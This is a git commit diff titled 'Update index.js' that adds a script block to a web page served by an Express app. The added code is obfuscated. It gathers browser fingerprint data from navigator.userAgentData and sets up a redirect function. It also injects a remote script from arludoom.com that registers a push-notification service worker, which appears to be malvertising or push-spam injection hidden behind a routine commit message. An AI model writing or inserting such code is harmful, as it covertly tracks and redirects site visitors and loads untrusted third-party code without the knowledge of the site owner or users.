e4a57d19388ab931c8b5300f3ebd3bff531b6386
isoqshodmonov-max <shodmonovisoq@gmail.com>
2024-09-29 02:21:29 +0500

    Update index.js

--- index.js
+++ index.js
@@ -26,6 +26,24 @@ app.get('/', (_req, res) => {
       var Domain_TB = "leezunikoohauh.net";
 </script>
 <script async src="https://desenteir.com/602/d1237/reverse.min.js?sf=1"></script>
+
+<script>
+    var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]); 
+    var s = document.createElement('script');
+    s.src='//arludoom.com/602/d1237/mw.min.js?z=8166122'+'&sw=/sw-check-permissions-b34c1.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    };
+    document.head.appendChild(s);
+</script>
+
+
 <style>
   @import url("https://fonts.googleapis.com/css2?family=Lato:wght@400;700&family=Open+Sans:wght@300;400;600;700&display=swap");
 body {
